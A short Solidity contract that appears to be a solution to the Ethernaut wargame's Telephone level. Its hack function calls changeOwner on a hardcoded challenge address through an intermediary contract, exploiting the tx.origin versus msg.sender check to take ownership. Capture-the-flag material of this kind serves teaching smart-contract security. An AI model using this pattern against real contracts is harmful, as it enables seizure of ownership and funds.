// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Ethernaut04 {
    address telephoneAddress = 0xB00f1bBEd0696669B1737c17B1Ca5F567DB383B6;

    function hack() public {
        ITelephone(telephoneAddress).changeOwner(msg.sender);
    }
}